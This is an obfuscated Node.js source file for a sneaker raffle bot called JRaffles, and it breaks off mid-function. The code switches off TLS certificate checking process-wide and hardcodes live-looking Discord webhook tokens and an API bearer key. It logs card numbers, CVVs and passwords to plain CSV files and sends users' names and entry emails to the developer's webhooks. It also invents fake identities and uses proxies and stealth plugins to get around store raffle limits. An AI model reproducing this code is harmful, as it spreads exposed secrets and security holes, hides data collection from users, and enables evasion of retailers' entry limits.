process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x7a56eb = require('fs'), _0x5d4fd4 = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x2fcb26(_0x35d332) {
    const _0x249f73 = _0x7a56eb['createWriteStream'](_0x35d332, { 'flags': 'a' }), _0x582573 = console['log'];
    console['log'] = function () {
        const _0x7ba086 = Array['prototype']['slice']['call'](arguments), _0xc3a33e = _0x7ba086['join']('\x20') + '\x0a';
        _0x249f73['write'](_0xc3a33e), _0x582573['apply'](console, _0x7ba086);
    };
}
_0x2fcb26('../logs/log\x20' + _0x5d4fd4);
var _0x25ee0a = require('tough-cookie'), _0x4d6860 = require('node-imap'), _0x5cec76 = require('util')['inspect'];
const _0x502d57 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x9549b4 } = require('discord.js');
var _0x37c998 = require('exe');
const { execFile: _0x53d43d } = require('child_process'), _0x51ff47 = require('puppeteer-extra'), _0x315f6a = require('cross-spawn'), _0x16fe7c = require('puppeteer-extra-plugin-recaptcha'), _0x30c330 = require('puppeteer-extra-plugin-stealth'), _0x16a3a0 = require('chalk'), _0x1b4448 = require('node-bash-title'), _0x3da5aa = require('axios'), _0x25c736 = require('papaparse');
var _0x372fc0 = require('random-name');
const _0x527126 = require('request');
var _0x125485 = require('prompt');
const _0x931e8b = _0x527126['jar']();
var _0x342ed0 = {};
const _0x526c02 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x2b0e54 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x2409c2 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x5c359b = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x5bffdb = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x5b04e0 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x3250a2 = 'https://discord.com/api/webhooks/', _0x1db480 = '' + _0x3250a2 + _0x2409c2, _0x36741f = '' + _0x3250a2 + _0x5c359b, _0x5ddcdd = '' + _0x3250a2 + _0x526c02, _0x2cdbb9 = '' + _0x3250a2 + _0x2b0e54, _0x259650 = '' + _0x3250a2 + _0x5bffdb, _0x1ef650 = '' + _0x3250a2 + _0x5b04e0;
const _0x11f897 = JSON['parse'](_0x7a56eb['readFileSync']('country.json', 'utf-8')), _0x48549b = JSON['parse'](_0x7a56eb['readFileSync']('../package.json', 'utf-8')), _0x4e463c = _0x48549b['version'];
var _0x318aef, _0x28792f, _0x4cbeb2, _0x23588f, _0x4c01bc, _0x503e2f, _0x34b198, _0x3378d3;
const _0x5c7aa0 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0xe7ea16 = ![];
const _0x165988 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x1ed050 = '0123456789';
var _0x2819ec = _0x165988['split']('');
const _0x1f5230 = require('auto-git-update'), _0x5600b3 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x19ac31 = new _0x1f5230(_0x5600b3);
async function _0x21ced4() {
    _0x4c01bc = _0x7a56eb['readdirSync']('../proxies'), _0x23588f = _0x7a56eb['readdirSync']('../tasks'), !_0x7a56eb['existsSync']('../accounts/fenom.csv') && _0x7a56eb['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x7a56eb['existsSync']('../accounts/paypal.csv') && _0x7a56eb['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x7a56eb['existsSync']('../accounts/bstn.csv') && _0x7a56eb['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x7a56eb['existsSync']('../accounts/eql.csv') && _0x7a56eb['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x7a56eb['existsSync']('../failed-tasks.csv') && _0x7a56eb['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x7a56eb['existsSync']('../successful-tasks.csv') && _0x7a56eb['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x342ed0 = JSON['parse'](_0x7a56eb['readFileSync']('../settings.json', 'utf-8')), !_0x342ed0['delay'] && (_0x342ed0['delay'] = 0x3c, _0x7a56eb['writeFileSync']('../settings.json', JSON['stringify'](_0x342ed0, null, 0x2))), !_0x342ed0['threads'] && (_0x342ed0['threads'] = 0x1, _0x7a56eb['writeFileSync']('../settings.json', JSON['stringify'](_0x342ed0, null, 0x2))), !_0x342ed0['python'] && (_0x315f6a('start', [
        'cmd',
        '/k',
        'py\x20-m\x20pip\x20install\x20-r\x20modules/Confirmed/requirements.txt'
    ], { 'shell': !![] }), _0x315f6a('start', [
        'cmd',
        '/k',
        'py\x20-m\x20pip\x20install\x20git+https://github.com/66niko99/py-adyen-encrypt.git'
    ], { 'shell': !![] }), _0x342ed0['python'] = 'uptodate', _0x7a56eb['writeFileSync']('../settings.json', JSON['stringify'](_0x342ed0, null, 0x2))), !_0x342ed0['masterMail'] && (_0x342ed0['masterMail'] = 'yourmail@gmail.com', _0x7a56eb['writeFileSync']('../settings.json', JSON['stringify'](_0x342ed0, null, 0x2))), !_0x342ed0['CapSolver'] && (_0x342ed0['CapSolver'] = 'yourkeyhere', _0x7a56eb['writeFileSync']('../settings.json', JSON['stringify'](_0x342ed0, null, 0x2))), !_0x342ed0['masterPassword'] && (_0x342ed0['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x7a56eb['writeFileSync']('../settings.json', JSON['stringify'](_0x342ed0, null, 0x2))), !_0x342ed0['captchaKey'] && (_0x342ed0['captchaKey'] = '', _0x7a56eb['writeFileSync']('../settings.json', JSON['stringify'](_0x342ed0, null, 0x2))), !_0x342ed0['useRandomProxy'] && (_0x342ed0['useRandomProxy'] = !![], _0x7a56eb['writeFileSync']('../settings.json', JSON['stringify'](_0x342ed0, null, 0x2))), !_0x342ed0['shuffleTasks'] && (_0x342ed0['shuffleTasks'] = ![], _0x7a56eb['writeFileSync']('../settings.json', JSON['stringify'](_0x342ed0, null, 0x2))), !_0x342ed0['webhook'] && (_0x342ed0['webhook'] = '', _0x7a56eb['writeFileSync']('../settings.json', JSON['stringify'](_0x342ed0, null, 0x2))), _0x342ed0['delay'] <= 0x1388 && (_0x342ed0['delay'] = _0x342ed0['delay'] * 0x3e8), _0x342ed0['AfewDelay'] && (delete _0x342ed0['AfewDelay'], _0x7a56eb['writeFileSync']('../settings.json', JSON['stringify'](_0x342ed0, null, 0x2))), _0x342ed0['MahaDelay'] && (delete _0x342ed0['MahaDelay'], _0x7a56eb['writeFileSync']('../settings.json', JSON['stringify'](_0x342ed0, null, 0x2))), _0x342ed0['footshopDelay'] && (delete _0x342ed0['footshopDelay'], _0x7a56eb['writeFileSync']('../settings.json', JSON['stringify'](_0x342ed0, null, 0x2))), _0x342ed0['MahaDelay'] = _0x342ed0['delay'], _0x3250a2 = _0x342ed0['webhook'], _0x503e2f = _0x342ed0['licenseKey'];
}
let _0x34a535, _0x4fe56f = [], _0x2c5dd7;
const _0x140651 = _0x50fa91 => new Promise(_0x37304d => setTimeout(_0x37304d, _0x50fa91));
function _0x302585(_0x525848, _0x46b7e4) {
    return Math['floor'](Math['random']() * (_0x46b7e4 - _0x525848 + 0x1) + _0x525848);
}
function _0x1a52f5(_0x1af121) {
    let _0x20fe24 = _0x1af121['length'], _0x2e0239;
    while (_0x20fe24 != 0x0) {
        _0x2e0239 = Math['floor'](Math['random']() * _0x20fe24), _0x20fe24--, [_0x1af121[_0x20fe24], _0x1af121[_0x2e0239]] = [
            _0x1af121[_0x2e0239],
            _0x1af121[_0x20fe24]
        ];
    }
    return _0x1af121;
}
async function _0x14dfc5(_0x4a2964) {
    try {
        return _0x3da5aa['post']('https://api.whop.com/api/v2/memberships/' + _0x4a2964 + '/validate_license', { 'metadata': { 'key': '' } }, {
            'headers': {
                'Authorization': 'Bearer\x20DRT4qDTPjhk0dbWMnuTDrMuGiUh6MogGpjZL6gSDoLU',
                'Content-Type': 'application/json'
            }
        });
    } catch (_0x2b8964) {
        console['log']('Error\x20checking\x20license:\x20' + _0x2b8964['message']);
    }
}
async function _0x162996(_0x5c36c7) {
    console['clear']();
    if (_0x5c36c7 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x53b112 = await _0x125485['get']('License');
        if (_0x53b112['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x140651(0xbb8), _0x162996(_0x5c36c7);
        _0x5c36c7 = _0x53b112['License'], _0x342ed0['licenseKey'] = _0x5c36c7, _0x503e2f = _0x5c36c7, _0x7a56eb['writeFileSync']('../settings.json', JSON['stringify'](_0x342ed0));
    }
    console['log']('Checking\x20license\x20' + _0x503e2f + '...'), await _0x140651(0x320);
    const _0x247321 = await _0x14dfc5(_0x5c36c7);
    _0x34b198 = JSON['stringify'](_0x247321['data']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x3378d3 = JSON['stringify'](_0x247321['data']['discord']['image_url'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x247321)
        return console['log']('License\x20not\x20found');
    if (!_0x247321['data'])
        return console['log']('License\x20not\x20bound');
    return _0x247321['data']['valid'] ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0xe7ea16 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0xe7ea16 = ![]);
}
async function _0x3c60fe() {
    var _0x4501ac = await _0x125485['get']('Module');
    return console['clear'](), _0x4501ac['Module'];
}
;
async function _0x3c0e3e() {
    var _0x9e6bb0 = await _0x125485['get']('Setting');
    return console['clear'](), _0x9e6bb0['Setting'];
}
async function _0x3757f6(_0x5adae0) {
    var _0x33f08c = [];
    for (file of _0x23588f) {
        var _0x4ee3d7 = _0x7a56eb['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x25c736['parse'](_0x4ee3d7, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x5adae0['store'] && _0x33f08c['push'](file);
    }
    !_0x33f08c['length'] == 0x0 && (_0x23588f = _0x33f08c);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x4cd634 = 0x0; _0x4cd634 < _0x23588f['length']; _0x4cd634++) {
        console['log']('\x20(' + _0x4cd634 + ')\x20' + _0x23588f[_0x4cd634]);
    }
    console['log']('');
    var _0x2a0eca = await _0x125485['get']('Task');
    if (_0x2a0eca['Task'] > _0x23588f['length'] - 0x1 || isNaN(_0x2a0eca['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x140651(0x3e8), _0x3757f6();
    var _0xaefbb0 = _0x7a56eb['readFileSync']('../tasks/' + _0x23588f[_0x2a0eca['Task']], 'utf-8');
    return _0x4cbeb2 = _0x25c736['parse'](_0xaefbb0, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x16a3a0['blue'](_0x23588f[_0x2a0eca['Task']])), _0x318aef = _0x23588f[_0x2a0eca['Task']], _0x4cbeb2;
}
async function _0x522b60() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x5e721f = 0x0; _0x5e721f < _0x4c01bc['length']; _0x5e721f++) {
        console['log']('\x20(' + _0x5e721f + ')\x20' + _0x4c01bc[_0x5e721f]);
    }
    console['log']('');
    var _0x2caecd = await _0x125485['get']('Proxies');
    if (_0x2caecd['Proxies'] > _0x4c01bc['length'] - 0x1 || isNaN(_0x2caecd['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x140651(0x3e8), _0x522b60();
    var _0x4ffd14 = _0x7a56eb['readFileSync']('../proxies/' + _0x4c01bc[_0x2caecd['Proxies']], 'utf-8')['split']('\x0a');
    let _0x192093 = _0x4ffd14['map']((_0x14731d, _0x1e077f) => {
        sanatizeProxy = _0x14731d['replace']('\x0d', '');
        if (_0x4ffd14[_0x1e077f + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x28792f = _0x4c01bc[_0x2caecd['Proxies']], console['clear'](), _0x192093;
}
async function _0x3ffb2d() {
    var _0xdd79a4 = await _0x125485['get']('Value');
    return console['clear'](), _0xdd79a4['Value'];
}
async function _0x4ed838(_0x1e6964) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x550d49 = 0x0; _0x550d49 < _0x1e6964['length']; _0x550d49++) {
        console['log']('\x20(' + _0x550d49 + ')\x20[' + _0x1e6964[_0x550d49]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x9791b1 = await _0x125485['get']('Module');
    return _0x9791b1['Module'];
}
async function _0x3a44c8() {
    var _0xee2c4d = await _0x125485['get']('Password');
    return console['clear'](), _0xee2c4d['Password'];
}
;
async function _0x38a89c() {
    var _0x2b1020 = await _0x125485['get']('Links');
    return _0x2b1020['Links'];
}
;
async function _0x1aceda() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x1a7cdc = 0x0; _0x1a7cdc < _0x4fe56f['length']; _0x1a7cdc++) {
        console['log']('\x20(' + _0x1a7cdc + ')\x20' + _0x4fe56f[_0x1a7cdc]);
    }
    ;
    console['log']();
    let _0x1f9b60 = await _0x125485['get']('Product');
    return console['clear'](), _0x1f9b60['Product'];
}
;
function _0x597cbe() {
    var _0x720116 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x720116;
}
;
function _0xf91d4d() {
    var _0x51d7c7 = new Date(Date['now']())['toLocaleString']();
    return _0x51d7c7['replace'](',', '');
}
async function _0x29bde2(_0x1d07d9, _0x3c2575) {
    let _0x43dbb8 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x4e463c != 'devkey') {
        await _0x3da5aa['post'](_0x1d07d9, _0x3c2575, _0x43dbb8);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x11b6e5(_0x3c4e12, _0x381edd, _0x49e740, _0x3b85c2, _0x92aa28) {
    if (!_0x3b85c2 && _0x49e740 == 'dev') {
        var _0x5bd13a = new _0x9549b4()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x381edd['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x381edd['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x3c4e12['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x342ed0['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x34b198,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x3c4e12['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x3c4e12['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x4e463c,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x5bd13a['data'];
    } else {
        if (_0x3b85c2 && _0x49e740 == 'dev') {
            var _0x5bd13a = new _0x9549b4()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x381edd['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x34b198,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x381edd['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x3c4e12['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x342ed0['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x92aa28,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x3c4e12['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x3c4e12['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x4e463c,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x5bd13a['data'];
        } else {
            if (_0x49e740 == 'pub') {
                var _0x5bd13a = new _0x9549b4()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x381edd['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x381edd['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x3c4e12['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x342ed0['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x3c4e12['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x4e463c,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x5bd13a['data'];
            } else {
                if (_0x49e740 == 'acc' && !_0x3b85c2) {
                    var _0x5bd13a = new _0x9549b4()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x381edd['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x34b198,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x381edd['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x342ed0['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x4e463c,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x5bd13a['data'];
                } else {
                    if (_0x49e740 == 'acc' && _0x3b85c2) {
                        var _0x5bd13a = new _0x9549b4()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x381edd['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x34b198,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x92aa28,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x381edd['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x342ed0['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x4e463c,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x5bd13a['data'];
                    } else {
                        if (_0x49e740 == 'open') {
                            var _0x5bd13a = new _0x9549b4()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x3378d3)['addFields']({
                                'name': 'User',
                                'value': '' + _0x34b198,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x4e463c,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x5bd13a['data'];
                        } else {
                            if (!_0x3b85c2 && _0x49e740 == 'ver') {
                                var _0x5bd13a = new _0x9549b4()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x381edd['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x34b198,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x381edd['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x342ed0['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x4e463c,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x5bd13a['data'];
                            } else {
                                if (_0x3b85c2 && _0x49e740 == 'ver') {
                                    var _0x5bd13a = new _0x9549b4()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x381edd['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x34b198,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x92aa28,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x381edd['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x342ed0['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x4e463c,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x5bd13a['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x58ea73(_0x28b998, _0x18e20b) {
    var _0x1e8984 = _0x28b998[_0x18e20b]['Address1']['split'](''), _0x2f0a4a = _0x28b998[_0x18e20b]['Address2']['split'](''), _0x5e04be = _0x28b998[_0x18e20b]['Email']['split']('@');
    for (var _0x748c8c = 0x0; _0x748c8c < _0x1e8984['length']; _0x748c8c++) {
        if (_0x1e8984[_0x748c8c] == 'X') {
            var _0x1b93bd = Math['round'](Math['random']() * (_0x165988['length'] - 0x1));
            _0x1e8984[_0x748c8c] = _0x2819ec[_0x1b93bd];
        }
    }
    ;
    for (var _0x748c8c = 0x0; _0x748c8c < _0x2f0a4a['length']; _0x748c8c++) {
        if (_0x2f0a4a[_0x748c8c] == 'X') {
            var _0x1b93bd = Math['round'](Math['random']() * (_0x165988['length'] - 0x1));
            _0x2f0a4a[_0x748c8c] = _0x2819ec[_0x1b93bd];
        }
    }
    ;
    _0x28b998[_0x18e20b]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x28b998[_0x18e20b]['FirstName'] = _0x372fc0['first']());
    _0x28b998[_0x18e20b]['LastName']['toUpperCase']() == 'RANDOM' && (_0x28b998[_0x18e20b]['LastName'] = _0x372fc0['last']());
    _0x5e04be[0x0]['toUpperCase']() == 'RANDOM' ? _0x5e04be[0x0] = '' + _0x372fc0['first']() + _0x372fc0['last']() + _0x302585(0x1, 0x3e7) + '@' : _0x5e04be[0x0] = _0x5e04be[0x0] + '@';
    _0x28b998[_0x18e20b]['Email'] = _0x5e04be['join'](''), _0x28b998[_0x18e20b]['Address1'] = _0x1e8984['join'](''), _0x28b998[_0x18e20b]['Address2'] = _0x2f0a4a['join']('');
    _0x28b998[_0x18e20b]['Phone'] == 'RANDOM' && (_0x28b998[_0x18e20b]['Phone'] = '0' + _0x302585(0x5f5e100, 0x3b9ac9ff));
    if (_0x28b998[_0x18e20b]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x568f88 = _0x302585(0x1, 0x270f);
        _0x28b998[_0x18e20b]['Follower'] = '' + _0x372fc0['first']() + _0x372fc0['last']() + _0x568f88 + '\x20';
    }
    _0x28b998[_0x18e20b]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x28b998[_0x18e20b]['HouseNumber'] = _0x302585(0x1, 0xc8));
    if (_0x28b998[_0x18e20b]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x2d28a4 = Math['round'](Math['random']() * (_0x165988['length'] - 0x1)), _0x478bff = _0x2819ec[_0x2d28a4];
        _0x28b998[_0x18e20b]['Address1'] = _0x372fc0['last']() + 'straat', _0x28b998[_0x18e20b]['Zip'] == '' && (_0x28b998[_0x18e20b]['Postcode'] = _0x302585(0x3e8, 0x270f) + '\x20' + _0x478bff + _0x478bff, _0x28b998[_0x18e20b]['Zip'] = _0x28b998[_0x18e20b]['Postcode']), _0x28b998[_0x18e20b]['HouseNumber'] = '' + _0x302585(0x1, 0xc8);
    }
    return;
}
;
async function _0x13d7e5(_0x3527de, _0x3683) {
    _0x7a56eb['appendFileSync']('../failed-tasks.csv', _0xf91d4d() + ',' + _0x3683['store'] + ',' + _0x3683['name'] + ',' + _0x3527de['Url'] + ',' + _0x3527de['Size'] + ',' + _0x3527de['Follower'] + ',' + _0x3527de['FirstName'] + ',' + _0x3527de['LastName'] + ',' + _0x3527de['Address1'] + ',' + _0x3527de['Address2'] + ',' + _0x3527de['HouseNumber'] + ',' + _0x3527de['Zip'] + ',' + _0x3527de['City'] + ',' + _0x3527de['State'] + ',' + _0x3527de['Country'] + ',' + _0x3527de['Phone'] + ',' + _0x3527de['Email'] + ',' + _0x3527de['Password'] + ',' + _0x3527de['PaymentMethod'] + ',' + _0x3527de['CardType'] + ',' + _0x3527de['NameOnCard'] + ',' + _0x3527de['CardNumber'] + ',' + _0x3527de['ExpiryDate'] + ',' + _0x3527de['CVV'] + ',' + _0x3527de['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x1ce4fb(_0x17c68a, _0x647594) {
    _0x7a56eb['appendFileSync']('../successful-tasks.csv', _0xf91d4d() + ',' + _0x647594['store'] + ',' + _0x647594['name'] + ',' + _0x17c68a['Url'] + ',' + _0x17c68a['Size'] + ',' + _0x17c68a['Follower'] + ',' + _0x17c68a['FirstName'] + ',' + _0x17c68a['LastName'] + ',' + _0x17c68a['Address1'] + ',' + _0x17c68a['Address2'] + ',' + _0x17c68a['HouseNumber'] + ',' + _0x17c68a['Zip'] + ',' + _0x17c68a['City'] + ',' + _0x17c68a['State'] + ',' + _0x17c68a['Country'] + ',' + _0x17c68a['Phone'] + ',' + _0x17c68a['Email'] + ',' + _0x17c68a['Password'] + ',' + _0x17c68a['PaymentMethod'] + ',' + _0x17c68a['CardType'] + ',' + _0x17c68a['NameOnCard'] + ',' + _0x17c68a['CardNumber'] + ',' + _0x17c68a['ExpiryDate'] + ',' + _0x17c68a['CVV'] + ',' + _0x17c68a['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x267599() {
    let _0x371005 = proxyFile['split']('\x0a'), _0x423b2a = _0x371005['map']((_0x1bed0c, _0x516d6a) => {
        sanatizeProxy = _0x1bed0c['replace']('\x0d', '');
        if (_0x371005[_0x516d6a + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x423b2a;
}
;
async function _0x113eb0(_0x149df0, _0x48def7) {
    if (_0x332dc6 != 'yes')
        var _0x332dc6 = '', _0x594317 = 0x0;
    async function _0x17e451() {
        var _0x4d4238 = _0x7a56eb['readFileSync']('../accounts/paypal.csv', 'utf-8');
